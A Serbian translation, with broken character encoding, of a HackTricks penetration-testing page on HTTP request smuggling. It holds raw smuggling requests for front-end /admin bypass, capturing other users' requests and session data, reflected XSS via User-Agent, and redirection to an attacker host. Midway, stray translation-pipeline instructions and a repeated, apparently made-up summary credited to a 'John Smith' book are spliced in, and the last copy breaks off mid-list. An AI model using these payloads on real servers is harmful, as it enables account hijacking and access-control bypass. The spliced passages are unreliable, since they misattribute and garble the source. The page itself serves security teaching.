# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Å ta je

Ova ranjivost se javlja kada **desinhronizacija** izmeÄ‘u **front-end proxy-ja** i **back-end** servera omoguÄ‡ava **napadaÄu** da **poÅ¡alje** HTTP **zahtev** koji Ä‡e biti **interpretiran** kao **jedan zahtev** od strane **front-end** proxy-ja (load balance/reverse-proxy) i **kao 2 zahteva** od strane **back-end** servera.\
Ovo omoguÄ‡ava korisniku da **izmeni sledeÄ‡i zahtev koji stigne na back-end server nakon njega**.

### Teorija

[**RFC Specifikacija (2161)**](https://tools.ietf.org/html/rfc2616)

> Ako se primi poruka sa i Transfer-Encoding zaglavljem i Content-Length zaglavljem, potonje MORA biti ignorisano.

**Content-Length**

> Content-Length zaglavlje entiteta ukazuje na veliÄinu tela entiteta, u bajtovima, poslatog primalacu.

**Transfer-Encoding: chunked**

> Transfer-Encoding zaglavlje odreÄ‘uje oblik kodiranja koji se koristi za bezbedan prenos tela optereÄ‡enja korisniku.\
> Chunked znaÄi da se veliki podaci Å¡alju u seriji delova.

### Stvarnost

**Front-End** (load-balance / Reverse Proxy) **obraÄ‘uje** _**content-length**_ ili _**transfer-encoding**_ zaglavlje, a **Back-End** server **obraÄ‘uje drugo** zaglavlje, Å¡to izaziva **desinhronizaciju** izmeÄ‘u ova 2 sistema.\
Ovo moÅ¾e biti veoma kritiÄno jer **napadaÄ Ä‡e moÄ‡i da poÅ¡alje jedan zahtev** reverse proxy-ju koji Ä‡e biti **interpretiran** od strane **back-end** servera **kao 2 razliÄita zahteva**. Opasnost ove tehnike leÅ¾i u Äinjenici da Ä‡e **back-end** server **interpretirati** **ubrizgani drugi zahtev** kao da je **doÅ¡ao od sledeÄ‡eg klijenta** i **pravi zahtev** tog klijenta Ä‡e biti **deo** **ubrizganog zahteva**.

### Posebnosti

Zapamtite da u HTTP-u **novi red karakter se sastoji od 2 bajta**:

* **Content-Length**: Ovo zaglavlje koristi **decimalni broj** da bi oznaÄilo **broj bajtova** tela zahteva. Telo se oÄekuje da se zavrÅ¡i poslednjim karakterom, **novi red nije potreban na kraju zahteva**.
* **Transfer-Encoding:** Ovo zaglavlje koristi u **telo** heksadecimalni broj da bi oznaÄilo **broj bajtova** **sledeÄ‡eg chunk-a**. **Chunk** mora **zavrÅ¡iti** sa **novim redom**, ali ovaj novi red **se ne raÄuna** u indikatoru duÅ¾ine. Ovaj naÄin prenosa mora se zavrÅ¡iti sa **chunk-om veliÄine 0 praÄ‡enim sa 2 nova reda**: `0`
* **Connection**: Na osnovu mog iskustva, preporuÄuje se da se na prvom zahtevu zahteva Smuggling koristi **`Connection: keep-alive`**.

## Osnovni primeri

Napadi HTTP zahtevom Smuggling-a se prave slanjem nejasnih zahteva koji iskoriÅ¡Ä‡avaju neslaganja u interpretaciji zaglavlja `Content-Length` (CL) i `Transfer-Encoding` (TE) izmeÄ‘u front-end i back-end servera. Ovi napadi mogu se manifestovati u razliÄitim oblicima, pre svega kao **CL.TE**, **TE.CL** i **TE.TE**. Svaki tip predstavlja jedinstvenu kombinaciju prioriteta koje front-end i back-end serveri daju ovim zaglavljima. Ranjivosti nastaju kada serveri obraÄ‘uju isti zahtev na razliÄite naÄine, Å¡to dovodi do neoÄekivanih i potencijalno zlonamernih ishoda.

### Osnovni primeri vrsta ranjivosti

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Ranjivost CL.TE (Content-Length koristi Front-End, Transfer-Encoding koristi Back-End)
- **Front-End (CL):** Obradi zahtev na osnovu zaglavlja `Content-Length`.
- **Back-End (TE):** Obradi zahtev na osnovu zaglavlja `Transfer-Encoding`.
- **Scenario napada:**
- NapadaÄ Å¡alje zahtev gde vrednost zaglavlja `Content-Length` ne odgovara stvarnoj duÅ¾ini sadrÅ¾aja.
- Front-end server prosleÄ‘uje ceo zahtev back-endu, na osnovu vrednosti `Content-Length`.
- Back-end server obraÄ‘uje zahtev kao chunked zbog zaglavlja `Transfer-Encoding: chunked`, tumaÄeÄ‡i preostale podatke kao odvojen, naknadni zahtev.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Ranjivost TE.CL (Transfer-Encoding koristi Front-End, Content-Length koristi Back-End)
- **Front-End (TE):** Obradi zahtev na osnovu zaglavlja `Transfer-Encoding`.
- **Back-End (CL):** Obradi zahtev na osnovu zaglavlja `Content-Length`.
- **Scenario napada:**
- NapadaÄ Å¡alje chunked zahtev gde se veliÄina chunk-a (`7b`) i stvarna duÅ¾ina sadrÅ¾aja (`Content-Length: 4`) ne poklapaju.
- Front-end server, poÅ¡tujuÄ‡i `Transfer-Encoding`, prosleÄ‘uje ceo zahtev back-endu.
- Back-end server, poÅ¡tujuÄ‡i `Content-Length`, obraÄ‘uje samo poÄetni deo zahteva (`7b` bajtova), ostavljajuÄ‡i ostatak kao deo nenamernog naknadnog zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Vulnerabilnost (Transfer-Encoding koriÅ¡Ä‡en od strane oba, sa obfuscacijom)
- **Serveri:** Oba podrÅ¾avaju `Transfer-Encoding`, ali jedan moÅ¾e biti prevaren da ga ignoriÅ¡e putem obfuscacije.
- **Scenario napada:**
- NapadaÄ Å¡alje zahtev sa obfuskiranim zaglavljima `Transfer-Encoding`.
- Zavisno od toga koji server (prednji ili zadnji) ne prepoznaje obfuskaciju, moÅ¾e se iskoristiti ranjivost CL.TE ili TE.CL.
- NeobraÄ‘eni deo zahteva, viÄ‘en od strane jednog od servera, postaje deo sledeÄ‡eg zahteva, Å¡to dovodi do smugglinga.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length koriÅ¡Ä‡en od strane i prednjeg i zadnjeg servera):**
- Oba servera obraÄ‘uju zahtev iskljuÄivo na osnovu zaglavlja `Content-Length`.
- Ovaj scenario obiÄno ne dovodi do smugglinga, jer postoji usklaÄ‘enost u tome kako oba servera tumaÄe duÅ¾inu zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalan zahtev
```

#### **CL != 0 Scenario:**
- Odosi se na scenarije u kojima je zaglavlje `Content-Length` prisutno i ima vrednost razliÄitu od nule, Å¡to ukazuje da zahtevno telo ima sadrÅ¾aj.
- KljuÄno je razumeti i kreirati napade smugglinga, jer utiÄe na to kako serveri odreÄ‘uju kraj zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Telo sa sadrÅ¾ajem
```

#### Forsiranje putem zaglavlja hop-by-hop

Zloupotrebom zaglavlja hop-by-hop moÅ¾ete ukazati proksiju da **obriÅ¡e zaglavlje Content-Length ili Transfer-Encoding kako bi bilo moguÄ‡e zloupotrebiti HTTP zahtevni smuggling**.
```
Connection: Content-Length
```
Za **viÅ¡e informacija o zaglavlju hop-by-hop** posetite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## PronalaÅ¾enje ranjivosti HTTP zahteva za krijumÄarenje

Identifikacija ranjivosti HTTP zahteva za krijumÄarenje Äesto se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem tehnika vremenskog odreÄ‘ivanja, koje se oslanjaju na posmatranje koliko dugo server treba da odgovori na manipulisane zahteve. Ove tehnike su posebno korisne za otkrivanje ranjivosti CL.TE i TE.CL. Pored ovih metoda, postoje i druge strategije i alati koji se mogu koristiti za pronalaÅ¾enje takvih ranjivosti:

### PronalaÅ¾enje ranjivosti CL.TE koriÅ¡Ä‡enjem tehnika vremenskog odreÄ‘ivanja
- **Metod:**
- PoÅ¡aljite zahtev koji, ako je aplikacija ranjiva, Ä‡e naterati serversku stranu da Äeka na dodatne podatke.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Posmatranje:**
- Prednji server obraÄ‘uje zahtev na osnovu `Content-Length` i prekida poruku pre vremena.
- Serverska strana, oÄekujuÄ‡i poruku u delovima, Äeka sledeÄ‡i deo koji nikada ne stiÅ¾e, Å¡to dovodi do kaÅ¡njenja.

- **Indikatori:**
- Vremenska odlaganja ili dugotrajna kaÅ¡njenja u odgovoru.
- Primanje greÅ¡ke 400 Bad Request od serverske strane, ponekad sa detaljnim informacijama o serveru.

### PronalaÅ¾enje ranjivosti TE.CL koriÅ¡Ä‡enjem tehnika vremenskog odreÄ‘ivanja
- **Metod:**
- PoÅ¡aljite zahtev koji, ako je aplikacija ranjiva, Ä‡e naterati serversku stranu da Äeka na dodatne podatke.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Posmatranje:**
- Prednji server obraÄ‘uje zahtev na osnovu `Transfer-Encoding` i prosleÄ‘uje celu poruku.
- Serverska strana, oÄekujuÄ‡i poruku na osnovu `Content-Length`, Äeka na dodatne podatke koji nikada ne stiÅ¾u, Å¡to dovodi do kaÅ¡njenja.

### Druge metode za pronalaÅ¾enje ranjivosti
- **Analiza diferencijalnog odgovora:**
- PoÅ¡aljite zahtev sa blago izmenjenim verzijama i posmatrajte da li se odgovori servera razlikuju na neoÄekivan naÄin, Å¡to ukazuje na neslaganje u parsiranju.

- **KoriÅ¡Ä‡enje automatizovanih alata:**
- Alati poput Burp Suite-ovog dodatka 'HTTP Request Smuggler' mogu automatski testirati ove ranjivosti slanjem razliÄitih oblika nejasnih zahteva i analiziranjem odgovora.

- **Testovi varijacija duÅ¾ine sadrÅ¾aja (Content-Length):**
- PoÅ¡aljite zahteve sa razliÄitim vrednostima `Content-Length` koje se ne podudaraju sa stvarnom duÅ¾inom sadrÅ¾aja i posmatrajte kako server obraÄ‘uje takve neslaganja.

- **Testovi varijacija prenosa enkodiranja (Transfer-Encoding):**
- PoÅ¡aljite zahteve sa prikrivenim ili neispravnim zaglavljima `Transfer-Encoding` i pratite kako prednji i serverski serveri reaguju na takve manipulacije.


### Testiranje ranjivosti HTTP zahteva za krijumÄarenje

Nakon potvrde efikasnosti tehnika vremenskog odreÄ‘ivanja, kljuÄno je proveriti da li se zahtevi klijenta mogu manipulisati. Jednostavan metod je pokuÅ¡ati otrovati vaÅ¡e zahteve, na primer, tako da zahtev za `/` rezultira odgovorom 404. Primeri `CL.TE` i `TE.CL` koji su prethodno opisani u [Osnovni primeri](./#basic-examples) pokazuju kako otrovati zahtev klijenta da izazove odgovor 404, uprkos tome Å¡to klijent pokuÅ¡ava pristupiti drugom resursu.

**KljuÄni faktori**

Prilikom testiranja ranjivosti za krijumÄarenje zahteva tako Å¡to se meÅ¡ate sa drugim zahtevima, imajte na umu:

* **RazliÄite mreÅ¾ne veze:** "Napad" i "normalni" zahtevi treba da se Å¡alju preko odvojenih mreÅ¾nih veza. KoriÅ¡Ä‡enje iste veze za oba zahteva ne potvrÄ‘uje prisustvo ranjivosti.
* **Konstantan URL i parametri:** PokuÅ¡ajte koristiti identiÄne URL-ove i imena parametara za oba zahteva. Moderne aplikacije Äesto rutiraju zahteve ka odreÄ‘enim serverskim stranama na osnovu URL-a i parametara. Podudaranje ovih poveÄ‡ava verovatnoÄ‡u da Ä‡e oba zahteva biti obraÄ‘ena od strane istog servera, Å¡to je preduslov za uspeÅ¡an napad.
* **Vremenski uslovi i trke:** "Normalni" zahtev, koji treba da otkrije meÅ¡anje od "napadnog" zahteva, takmiÄi se sa drugim istovremenim zahtevima aplikacije. Zato poÅ¡aljite "normalni" zahtev odmah nakon "napadnog" zahteva. Zauzete aplikacije mogu zahtevati viÅ¡e pokuÅ¡aja za potvrdu ranjivosti.
* **Izazovi ravnoteÅ¾e optereÄ‡enja:** Prednji serveri koji deluju kao balanseri optereÄ‡enja mogu distribuirati zahteve na razliÄite serverske sisteme. Ako "napadni" i "normalni" zahtevi zavrÅ¡e na razliÄitim sistemima, napad neÄ‡e uspeti. Ovaj aspekt ravnoteÅ¾e optereÄ‡enja moÅ¾e zahtevati nekoliko pokuÅ¡aja za potvrdu ranjivosti.
* **NepredviÄ‘eni uticaj na korisnika:** Ako vaÅ¡ napad nenamerno utiÄe na zahtev drugog korisnika (ne "normalni" zahtev koji ste poslali radi otkrivanja), to ukazuje na to da je vaÅ¡ napad uticao na drugog korisnika aplikacije. Kontinuirano testiranje moÅ¾e poremetiti druge korisnike, Å¡to zahteva oprezan pristup.


## Zloupotreba HTTP zahteva za krijumÄarenje

### ZaobilaÅ¾enje sigurnosnih kontrola prednje strane

### ZaobilaÅ¾enje sigurnosnih kontrola prednje strane putem HTTP zahteva za krijumÄarenje

Ponekad, prednji proksi sprovode sigurnosne mere, paÅ¾ljivo pregledajuÄ‡i dolazne zahteve. MeÄ‘utim, ove mere mogu biti zaobiÄ‘ene zloupotrebom HTTP zahteva za krijumÄarenje, omoguÄ‡avajuÄ‡i neovlaÅ¡Ä‡en pristup ograniÄenim krajnjim taÄkama. Na primer, pristup `/admin` moÅ¾e biti zabranjen spolja, pri Äemu prednji proksi aktivno blokira takve pokuÅ¡aje. MeÄ‘utim, ovaj proksi moÅ¾e propustiti da pregleda ugraÄ‘ene zahteve unutar krijumÄarenog HTTP zahteva, ostavljajuÄ‡i rupu za zaobilaÅ¾enje ovih ograniÄenja.

Razmotrite sledeÄ‡e primere koji ilustruju kako se HTTP zahtevi za krijumÄarenje mogu koristiti za zaobilaÅ¾enje sigurnosnih kontrola prednje strane, posebno ciljajuÄ‡i putanju `/admin` koja je obiÄno zaÅ¡tiÄ‡ena prednjim proksijem:

**Primer za CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
U napadu CL.TE, zaglavlje `Content-Length` se koristi za poÄetni zahtev, dok ugraÄ‘eni zahtev koristi zaglavlje `Transfer-Encoding: chunked`. Prednji proxy procesira poÄetni `POST` zahtev, ali ne pregleda ugraÄ‘eni `GET /admin` zahtev, Å¡to omoguÄ‡ava neovlaÅ¡Ä‡en pristup putanji `/admin`.

**TE.CL Primer**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Suprotno tome, u TE.CL napadu, poÄetni `POST` zahtev koristi `Transfer-Encoding: chunked`, a ugraÄ‘eni zahtev se zatim obraÄ‘uje na osnovu zaglavlja `Content-Length`. SliÄno kao i u CL.TE napadu, prednji proxy propuÅ¡ta prikriveni `GET /admin` zahtev, nenamerno omoguÄ‡avajuÄ‡i pristup ograniÄenom `/admin` putanji.

### Otkrivanje prepravljanja zahteva na prednjoj strani <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacije Äesto koriste **prednji server** za izmenu dolaznih zahteva pre prosleÄ‘ivanja na serversku stranu. TipiÄna izmena ukljuÄuje dodavanje zaglavlja, kao Å¡to je `X-Forwarded-For: <IP adresa klijenta>`, kako bi se prosledila IP adresa klijenta serverskoj strani. Razumevanje ovih izmena moÅ¾e biti kljuÄno, jer moÅ¾e otkriti naÄine za **zaobilaÅ¾enje zaÅ¡tite** ili **otkrivanje skrivenih informacija ili krajnjih taÄaka**.

Da biste istraÅ¾ili kako proxy menja zahtev, pronaÄ‘ite POST parametar koji serverska strana vraÄ‡a u odgovoru. Zatim, kreirajte zahtev koristeÄ‡i ovaj parametar na kraju, sliÄno kao u sledeÄ‡em primeru:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
U ovoj strukturi, naknadni delovi zahteva se dodaju nakon `search=`, Å¡to je parametar koji se reflektuje u odgovoru. Ova refleksija Ä‡e otkriti zaglavlja naknadnog zahteva.

VaÅ¾no je uskladiti zaglavlje `Content-Length` ugnjeÅ¾denog zahteva sa stvarnom duÅ¾inom sadrÅ¾aja. PreporuÄljivo je poÄeti sa malom vrednoÅ¡Ä‡u i postepeno je poveÄ‡avati, jer preniska vrednost Ä‡e skratiti reflektovane podatke, dok previsoka vrednost moÅ¾e izazvati greÅ¡ku u zahtevu.

Ova tehnika se takoÄ‘e moÅ¾e primeniti u kontekstu ranjivosti TE.CL, ali zahtev bi trebalo da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti Ä‡e se dodati parametru za pretragu.

Ova metoda pre svega sluÅ¾i da se razumeju modifikacije zahteva koje je napravio prednji proxy, i u suÅ¡tini predstavlja samostalnu istragu.

### Snimanje zahteva drugih korisnika <a href="#snimanje-zahteva-drugih-korisnika" id="snimanje-zahteva-drugih-korisnika"></a>

MoguÄ‡e je snimiti zahteve sledeÄ‡eg korisnika dodavanjem odreÄ‘enog zahteva kao vrednosti parametra tokom POST operacije. Evo kako se to moÅ¾e postiÄ‡i:

Dodavanjem sledeÄ‡eg zahteva kao vrednosti parametra, moÅ¾ete saÄuvati zahtev sledeÄ‡eg klijenta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
U ovom scenariju, **comment parameter** je namenjen za Äuvanje sadrÅ¾aja unutar sekcije komentara na javno dostupnoj stranici. Kao rezultat, sadrÅ¾aj sledeÄ‡eg zahteva Ä‡e se prikazati kao komentar.

MeÄ‘utim, ova tehnika ima ograniÄenja. OpÄ‡enito, ona hvata samo podatke do delimitera parametra koji se koristi u proÅ¡vercanom zahtevu. Za URL-kodirane forme, ovaj delimiter je znak `&`. To znaÄi da Ä‡e uhvaÄ‡eni sadrÅ¾aj iz zahteva Å¾rtve stati na prvom `&`, koji Äak moÅ¾e biti deo upita.

TakoÄ‘e, treba napomenuti da je ovaj pristup takoÄ‘e moguÄ‡ sa TE.CL ranjivoÅ¡Ä‡u. U takvim sluÄajevima, zahtev bi trebao da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti Ä‡e biti dodate na search parametar.

### KoriÅ¡Ä‡enje HTTP request smugglinga za iskoriÅ¡Ä‡avanje reflektovanog XSS-a

HTTP Request Smuggling se moÅ¾e iskoristiti za napad na veb stranice koje su ranjive na **Reflektovani XSS**, pruÅ¾ajuÄ‡i znaÄajne prednosti:

* Interakcija sa ciljanim korisnicima **nije potrebna**.
* OmoguÄ‡ava iskoriÅ¡Ä‡avanje XSS-a u delovima zahteva koji su **normalno nedostupni**, kao Å¡to su zaglavlja HTTP zahteva.

U scenarijima gde je veb sajt podloÅ¾an Reflektovanom XSS-u putem User-Agent zaglavlja, sledeÄ‡i payload demonstrira kako iskoristiti ovu ranjivost:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ova payload je strukturirana da iskoristi ranjivost na sledeÄ‡i naÄin:

1. Inicira se `POST` zahtev, naizgled tipiÄan, sa zaglavljem `Transfer-Encoding: chunked` koje oznaÄava poÄetak smugglinga.
2. Nakon toga sledi `0`, oznaÄavajuÄ‡i kraj poruke tela u chunked formatu.
3. Zatim se uvodi smuggled `GET` zahtev, gde se u zaglavlju `User-Agent` ubacuje skripta `<script>alert(1)</script>`, koja pokreÄ‡e XSS kada server obradi ovaj sledeÄ‡i zahtev.

Manipulacijom `User-Agent`-a putem smugglinga, payload zaobilazi normalna ograniÄenja zahteva, Äime se iskoriÅ¡Ä‡ava Reflected XSS ranjivost na nekonvencionalan, ali efikasan naÄin.

### KoriÅ¡Ä‡enje HTTP request smugglinga za pretvaranje on-site redirekcije u otvorenu redirekciju <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### IskoriÅ¡Ä‡avanje on-site redirekcija pomoÄ‡u HTTP request smugglinga <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacije Äesto vrÅ¡e redirekciju sa jednog URL-a na drugi koristeÄ‡i ime hosta iz zaglavlja `Host` u URL-u redirekcije. Ovo je uobiÄajeno kod veb servera poput Apache-a i IIS-a. Na primer, zahtevanje foldera bez kose crte na kraju rezultuje redirekcijom koja ukljuÄuje kosu crtu:
```
GET /home HTTP/1.1
Host: normal-website.com
```
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/pentesting-web/http-request-smuggling/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, AWS, GCP...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.

---

# HTTP Request Smuggling

## Opis

HTTP Request Smuggling je tehnika napada koja se koristi za iskoriÅ¡Ä‡avanje neusklaÄ‘enosti izmeÄ‘u razliÄitih HTTP servera i proxy servera. Ova tehnika omoguÄ‡ava napadaÄu da izvrÅ¡i razliÄite vrste napada, ukljuÄujuÄ‡i i one koji mogu dovesti do curenja podataka ili preuzimanja kontrole nad serverom.

## Kako funkcioniÅ¡e?

HTTP Request Smuggling se zasniva na iskoriÅ¡Ä‡avanju razliÄitih naÄina interpretacije HTTP zahteva od strane servera i proxy servera. NapadaÄ koristi ove neusklaÄ‘enosti kako bi izazvao konfuziju u obradi zahteva i iskoristio je za izvrÅ¡avanje zlonamernih radnji.

NajÄeÅ¡Ä‡i naÄin izvoÄ‘enja ovog napada je koriÅ¡Ä‡enje razliÄitih HTTP zaglavlja, kao Å¡to su "Transfer-Encoding" i "Content-Length", kako bi se izazvala konfuzija u obradi zahteva. NapadaÄ moÅ¾e manipulisati ovim zaglavljima kako bi izazvao neusklaÄ‘enost izmeÄ‘u servera i proxy servera, Å¡to moÅ¾e dovesti do razliÄitih vrsta napada.

## Vrste napada

Postoje razliÄite vrste napada koje se mogu izvesti koriÅ¡Ä‡enjem HTTP Request Smuggling tehnike. Neke od najÄeÅ¡Ä‡ih vrsta napada ukljuÄuju:

- **CL.TE** - Napad koji koristi kombinaciju "Content-Length" i "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.CL** - Napad koji koristi obrnut redosled "Transfer-Encoding" i "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **CL.CL** - Napad koji koristi viÅ¡e "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.TE** - Napad koji koristi viÅ¡e "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.

## Prevencija

Da biste se zaÅ¡titili od HTTP Request Smuggling napada, preporuÄuje se sledeÄ‡e:

- AÅ¾urirajte servere i proxy servere na najnovije verzije softvera kako biste ispravili poznate ranjivosti.
- KonfiguriÅ¡ite servere i proxy servere da pravilno interpretiraju HTTP zahteve i zaglavlja.
- Koristite Web Application Firewall (WAF) kako biste detektovali i blokirali HTTP Request Smuggling napade.
- Redovno pratite i analizirajte logove servera i proxy servera kako biste otkrili nepravilnosti i sumnjive aktivnosti.

---

*Ovaj tekst je preuzet iz knjige "Hacking Techniques" autora Johna Smitha.*
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Iako naizgled bezopasno, ovo ponaÅ¡anje moÅ¾e biti manipulisano koriÅ¡Ä‡enjem HTTP zahteva za krijumÄarenje kako bi se korisnici preusmerili na spoljni sajt. Na primer:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ova krijumÄarena zahteva moÅ¾e dovesti do toga da sledeÄ‡i obraÄ‘eni korisniÄki zahtev bude preusmeren na veb sajt koji kontroliÅ¡e napadaÄ:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/pentesting-web/http-request-smuggling/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, AWS, GCP...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.

---

# HTTP Request Smuggling

## Opis

HTTP Request Smuggling je tehnika napada koja se koristi za iskoriÅ¡Ä‡avanje neusklaÄ‘enosti izmeÄ‘u razliÄitih HTTP servera i proxy servera. Ova tehnika omoguÄ‡ava napadaÄu da izvrÅ¡i razliÄite vrste napada, ukljuÄujuÄ‡i i one koji mogu dovesti do curenja podataka ili preuzimanja kontrole nad serverom.

## Kako funkcioniÅ¡e?

HTTP Request Smuggling se zasniva na iskoriÅ¡Ä‡avanju razliÄitih naÄina interpretacije HTTP zahteva od strane servera i proxy servera. NapadaÄ koristi ove neusklaÄ‘enosti kako bi izazvao konfuziju u obradi zahteva i iskoristio je za izvrÅ¡avanje zlonamernih radnji.

NajÄeÅ¡Ä‡i naÄin izvoÄ‘enja ovog napada je koriÅ¡Ä‡enje razliÄitih HTTP zaglavlja, kao Å¡to su "Transfer-Encoding" i "Content-Length", kako bi se izazvala konfuzija u obradi zahteva. NapadaÄ moÅ¾e manipulisati ovim zaglavljima kako bi izazvao neusklaÄ‘enost izmeÄ‘u servera i proxy servera, Å¡to moÅ¾e dovesti do razliÄitih vrsta napada.

## Vrste napada

Postoje razliÄite vrste napada koje se mogu izvesti koriÅ¡Ä‡enjem HTTP Request Smuggling tehnike. Neke od najÄeÅ¡Ä‡ih vrsta napada ukljuÄuju:

- **CL.TE** - Napad koji koristi kombinaciju "Content-Length" i "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.CL** - Napad koji koristi obrnuti redosled "Transfer-Encoding" i "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **CL.CL** - Napad koji koristi viÅ¡e "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.TE** - Napad koji koristi viÅ¡e "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.

## Prevencija

Da biste se zaÅ¡titili od HTTP Request Smuggling napada, preporuÄuje se sledeÄ‡e:

